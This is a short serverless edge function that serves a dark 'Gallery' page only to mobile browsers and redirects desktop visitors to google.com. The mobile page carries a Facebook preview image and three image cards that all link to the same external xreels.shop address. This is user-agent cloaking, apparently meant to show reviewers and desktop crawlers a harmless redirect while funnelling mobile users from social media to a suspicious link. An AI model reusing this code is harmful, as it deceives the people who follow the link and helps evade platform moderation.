
export async function onRequest(context) {
  const ua = context.request.headers.get("user-agent") || "";

  const isMobile = /Android|iPhone|iPad|iPod|Mobile|Tablet|webOS|BlackBerry|Opera Mini/i.test(ua);

  // Desktop → Google
  if (!isMobile) {
    return Response.redirect("https://google.com", 302);
  }

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#080808">

<!-- Facebook Image Card -->
<meta property="og:image" content="1.jpg">

<title>Gallery</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background: #080808;
  color: #fff;
  font-family: Arial, sans-serif;
  min-height: 100vh;
  padding: 25px 16px;
}

.header {
  text-align: center;
  padding: 12px 0 30px;
}

.header h1 {
  font-size: 25px;
  font-weight: 500;
  letter-spacing: 3px;
  color: #e5c98b;
}

.gallery {
  max-width: 1000px;
  margin: auto;
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 20px;
}

.card {
  position: relative;
  display: block;
  overflow: hidden;
  text-decoration: none;
  border-radius: 16px;
  background: #151515;
  border: 1px solid rgba(214,178,105,.35);
  box-shadow: 0 10px 35px rgba(0,0,0,.5);
}

.card img {
  width: 100%;
  aspect-ratio: 4 / 5;
  object-fit: cover;
  display: block;
  transition: transform .5s ease;
}

.card:hover img {
  transform: scale(1.07);
}

.card::after {
  content: "";
  position: absolute;
  inset: 55% 0 0;
  background: linear-gradient(transparent, rgba(0,0,0,.35));
  pointer-events: none;
}

.card:hover {
  border-color: #d8b66e;
  box-shadow: 0 12px 35px rgba(199,158,83,.18);
}

@media(max-width: 650px) {
  .gallery {
    grid-template-columns: 1fr;
    max-width: 430px;
    gap: 18px;
  }

  .header {
    padding-bottom: 24px;
  }
}
</style>
</head>

<body>

<header class="header">
  <h1>GALLERY</h1>
</header>

<main class="gallery">

  <a class="card" href="https://xreels.shop/web/f0rf">
    <img src="https://studious-palm.pages.dev/3.jpg" alt="Gallery 1">
  </a>

  <a class="card" href="https://xreels.shop/web/f0rf">
    <img src="https://studious-palm.pages.dev/2.jpg" alt="Gallery 2">
  </a>

  <a class="card" href="https://xreels.shop/web/f0rf">
    <img src="https://studious-palm.pages.dev/1.jpg" alt="Gallery 3">
  </a>

</main>

</body>
</html>`;

  return new Response(html, {
    status: 200,
    headers: {
      "Content-Type": "text/html; charset=UTF-8",
      "Cache-Control": "no-cache"
    }
  });
}
